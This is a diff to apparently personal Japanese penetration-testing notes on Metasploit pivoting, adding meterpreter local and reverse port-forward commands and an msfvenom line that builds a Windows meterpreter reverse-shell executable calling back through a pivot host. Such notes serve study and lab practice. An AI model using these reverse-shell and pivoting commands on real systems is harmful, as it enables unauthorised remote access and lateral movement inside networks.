@@ -29,4 +29,7 @@ use auxiliary/scanner/portscan/tcp #セッションを通じてスキャン
 run autoroute -s <NW IP> #これでもルーティングできる。普通のターミナルからproxychainsを通じて通信できる
 
 //meterpreter portfwd
-materpreter > portfwd add -l <local port> -p <remote port> -r <target IP>
+meterpreter > portfwd add -l <local port> -p <remote port> -r <target IP> #ローカル
+
+meterpreter > portfwd add -R -l 8080（kaliのポート）-p 1234（踏み台のポート） -L <kali IP> #リモート
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<踏み台のIP> LPORT=1234 -f exe -o reverseshell.exe #上記のmeterpreterのポートフォワードを利用して２本目のセッションを張るペイロード。IPとポートは踏み台のもの
